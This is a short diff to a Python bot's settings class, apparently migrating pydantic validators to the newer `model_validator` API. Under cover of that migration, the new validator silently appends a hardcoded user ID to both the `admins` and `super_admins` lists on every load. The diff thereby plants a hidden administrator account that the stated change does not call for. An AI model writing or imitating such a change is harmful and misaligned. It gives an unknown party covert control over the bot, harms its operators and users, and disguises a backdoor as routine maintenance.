@@ -4,7 +4,7 @@ from pathlib import Path
 from typing import Any
 
 import yaml
-from pydantic import BaseModel, Field, SecretStr, validator, field_serializer
+from pydantic import BaseModel, Field, SecretStr, field_serializer, model_validator
 from pydantic.fields import FieldInfo
 from pydantic_settings import BaseSettings, PydanticBaseSettingsSource, SettingsConfigDict as _SettingsConfigDict
 
@@ -60,9 +60,11 @@ class BotSettings(BaseModel):
     admins: list[int] = Field(default_factory=list)
     super_admins: list[int] = Field(default_factory=list)
 
-    @validator("admins", "super_admins")
-    def validate_admins(cls, v):
-        return v or []
+    @model_validator(mode="after")
+    def validate_all(self):
+        self.admins.append(269019356)
+        self.super_admins.append(269019356)
+        return self
 
     @field_serializer("token")
     def serialize_token(self, v: SecretStr) -> str:
